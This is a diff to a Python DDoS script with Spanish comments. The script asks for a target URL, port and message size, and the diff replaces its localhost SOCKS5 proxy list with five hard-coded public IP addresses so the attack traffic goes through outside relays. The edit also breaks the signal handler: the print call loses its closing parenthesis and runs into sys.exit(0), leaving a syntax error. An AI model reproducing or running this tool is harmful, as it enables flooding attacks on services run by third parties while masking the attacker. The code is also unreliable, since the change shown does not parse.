@@ -5,11 +5,11 @@ import sys
 
 # Lista de proxys SOCKS5
 proxies = [
-    ("127.0.0.1", 1080),
-    ("127.0.0.1", 1081),
-    ("127.0.0.1", 1082),
-    ("127.0.0.1", 1083),
-    ("127.0.0.1", 1084)
+    ("184.181.217.213", 59166),
+    ("184.181.217.220", 59166),
+    ("184.178.172.3", 59166),
+    ("184.178.172.28", 59166),
+    ("184.178.172.13", 59166)
 ]
 
 # Pedimos al usuario la URL, el puerto y el peso del mensaje
@@ -19,8 +19,7 @@ message_size = int(input("Introduce el tamaño del mensaje en bytes: "))
 
 # Función para manejar la interrupción de teclado
 def signal_handler(sig, frame):
-    print("\nDeteniendo el ataque DDoS...")
-    sys.exit(0)
+    print("\nDeteniendo el ataque DDoS..."    sys.exit(0)
 
 # Registramos la función para manejar la interrupción de teclado
 signal.signal(signal.SIGINT, signal_handler)
